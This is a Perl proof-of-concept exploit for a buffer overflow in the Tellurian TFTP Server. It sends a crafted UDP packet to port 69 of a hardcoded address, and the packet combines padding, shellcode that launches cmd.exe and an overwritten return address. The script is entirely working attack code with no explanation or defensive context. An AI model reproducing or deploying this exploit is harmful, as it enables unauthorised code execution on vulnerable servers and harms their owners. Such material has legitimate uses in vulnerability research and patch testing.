 #!/usr/bin/perl -w
 #Tellurian TFTP Server buffer overflow vulnerability

 use IO::Socket;
 $host = "192.168.1.44";
 $port = "69";

 $shellcode = "\x90\xCC\x90\x90\x90\x90\x8B\xEC\x55\x8B\xEC\x33\
 \xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\
 \xFA\x64\xC6\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78\xC6\
 \x45\xFE\x65\xB8\xC3\xAF\x01\x78\x50\x8D\x45\xF8\x50\xFF\x55\xF4\x5F";

 $buf = "\x00\x02";
 $buf .= "\x41"x(508-length($shellcode));
 $buf .= $shellcode;
 $buf .= "\x0F\x02\xC7"; # EIP
 $buf .= "\x00\x6E\x65\x74\x61\x73\x63\x69\x69\x00";

 print "Length: ", length($buf), "\n";

 $socket = IO::Socket::INET->new(Proto => "udp") or die "Socket error:
 $@\n";
 $ipaddr = inet_aton($host) || $host;
 $portaddr = sockaddr_in($port, $ipaddr);
 send($socket, $buf, 0, $portaddr) == length($buf) or die "Can't send: $!\n";
 print "Done\n";
